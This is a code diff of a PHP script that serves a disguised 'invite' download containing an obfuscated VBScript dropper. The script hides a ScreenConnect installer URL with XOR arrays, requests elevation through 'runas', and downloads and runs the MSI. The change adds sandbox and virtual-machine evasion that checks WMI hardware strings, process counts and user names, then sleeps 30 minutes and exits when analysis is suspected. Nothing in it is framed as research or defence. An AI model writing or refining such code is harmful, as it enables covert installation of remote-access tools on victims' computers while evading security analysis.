@@ -1,5 +1,5 @@
 <?php
-// invite.php - Full encoded output + XOR arrays for MSI URL
+// invite.php - Encoded VBS + VM/Sandbox check (30 min sleep)
 header('Content-Type: text/plain; charset=utf-8');
 header('Cache-Control: no-store, no-cache, must-revalidate');
 
@@ -32,7 +32,7 @@ header('Content-Disposition: attachment; filename="' . $chosen . '"');
 // ===== MSI URL =====
 $msiUrl = "https://party.nyc3.cdn.digitaloceanspaces.com/ScreenConnect.ClientSetup%20(1).msi";
 
-// ===== Generate random XOR key array =====
+// ===== Generate XOR arrays for MSI URL =====
 $key = [];
 $cipher = [];
 $urlLen = strlen($msiUrl);
@@ -43,7 +43,6 @@ for ($i = 0; $i < $urlLen; $i++) {
     $cipher[] = ord($msiUrl[$i]) ^ $k;
 }
 
-// ===== Helper to format arrays exactly as requested =====
 function formatArray($arr) {
     $lines = [];
     $chunks = array_chunk($arr, 10);
@@ -56,16 +55,86 @@ function formatArray($arr) {
     return implode(", _\r\n", $lines);
 }
 
-$keyFormatted   = formatArray($key);
+$keyFormatted    = formatArray($key);
 $cipherFormatted = formatArray($cipher);
 
-// ===== REAL VBS (with XOR arrays) =====
+// ===== REAL VBS (with VM check + XOR URL) =====
 $realVbs = <<<REAL
-Dim objShell, objFSO, msiURL, mefinuwig, harogilim, i
+Option Explicit
+
+Dim svc, score, objShell, objFSO, msiURL, mefinuwig, harogilim, i
+score = 0
+
+On Error Resume Next
+Set svc = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2")
+If Err.Number <> 0 Then WScript.Quit
+On Error GoTo 0
+
+Sub AddFinding(points)
+    score = score + points
+End Sub
+
+Function ContainsAny(value, needles)
+    Dim needle
+    ContainsAny = False
+    value = LCase(CStr(value))
+    For Each needle In needles
+        If InStr(value, LCase(CStr(needle))) > 0 Then
+            ContainsAny = True
+            Exit Function
+        End If
+    Next
+End Function
+
+Dim item, textValue, count, shell, env, userName, computerName
+
+On Error Resume Next
+
+For Each item In svc.ExecQuery("SELECT Manufacturer, Model FROM Win32_ComputerSystem")
+    textValue = CStr(item.Manufacturer) & " " & CStr(item.Model)
+    If ContainsAny(textValue, Array("vmware", "virtualbox", "virtual machine", "kvm", "qemu", "xen", "parallels", "hyper-v")) Then
+        AddFinding 3
+    End If
+Next
+
+For Each item In svc.ExecQuery("SELECT Manufacturer, SMBIOSBIOSVersion, SerialNumber FROM Win32_BIOS")
+    textValue = CStr(item.Manufacturer) & " " & CStr(item.SMBIOSBIOSVersion) & " " & CStr(item.SerialNumber)
+    If ContainsAny(textValue, Array("vmware", "virtualbox", "vbox", "qemu", "xen", "parallels", "hyper-v")) Then
+        AddFinding 3
+    End If
+Next
+
+For Each item In svc.ExecQuery("SELECT Model, Manufacturer FROM Win32_DiskDrive")
+    textValue = CStr(item.Manufacturer) & " " & CStr(item.Model)
+    If ContainsAny(textValue, Array("vmware", "virtual", "vbox", "qemu", "xen")) Then
+        AddFinding 2
+    End If
+Next
+
+count = 0
+For Each item In svc.ExecQuery("SELECT Name FROM Win32_Process")
+    count = count + 1
+Next
+If count < 35 Then AddFinding 1
+
+Set shell = CreateObject("WScript.Shell")
+Set env = shell.Environment("PROCESS")
+userName = env("USERNAME")
+computerName = env("COMPUTERNAME")
+If ContainsAny(userName & " " & computerName, Array("sandbox", "malware", "analysis", "sample", "test")) Then
+    AddFinding 1
+End If
+
+' ===== BEHAVIOUR ON DETECTION (30 min sleep + silent exit) =====
+If score >= 3 Then
+    WScript.Sleep 1800000   ' 30 minutes
+    WScript.Quit
+End If
+
+' ===== Continue only if score is low =====
 Set objShell = CreateObject("WScript.Shell")
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 
-' ===== XOR Reconstruction of MSI URL =====
 mefinuwig = Array( _
 $keyFormatted )
 harogilim = Array( _
@@ -76,9 +145,9 @@ For i = 0 To UBound(harogilim)
 Next
 
 If WScript.Arguments.Length = 0 Then
-    Dim shell
-    Set shell = CreateObject("Shell.Application")
-    shell.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ elevated", "", "runas", 0
+    Dim elevShell
+    Set elevShell = CreateObject("Shell.Application")
+    elevShell.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ elevated", "", "runas", 0
     WScript.Quit
 End If
 
@@ -103,7 +172,7 @@ Call DownloadAndExecute
 WScript.Quit
 REAL;
 
-// ===== Base64 chunk encoding (your original method) =====
+// ===== Base64 chunk encoding =====
 $chunkSize = 100;
 $base64 = base64_encode($realVbs);
 $len = strlen($base64);
